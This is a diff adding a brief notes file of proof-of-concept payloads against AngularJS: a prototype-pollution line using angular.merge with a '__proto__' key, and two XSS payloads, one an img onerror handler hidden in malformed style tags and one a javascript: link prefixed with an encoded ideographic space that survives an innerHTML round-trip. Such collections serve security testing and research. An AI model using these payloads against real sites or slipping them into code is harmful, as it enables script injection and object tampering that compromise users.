@@ -1,0 +1,16 @@
+Prototype Pollution:
+
+angular.merge({}, JSON.parse('{"__proto__": {"xxx": "polluted"}}')); console.log(({}).xxx);
+
+
+XSS:
+
+const inertPayload = `<div><style><style/><img src=x onerror="alert(1337)"/>`
+angular.element(document).append(inertPayload);
+
+
+XSS:
+
+var h1 = document.querySelector('h1'); h1.innerHTML = '<a href="&#x3000;javascript:alert(1)">CLICKME</a>'; var innerHTML = h1.innerHTML; console.log(innerHTML); h1.innerHTML = innerHTML;
+
+
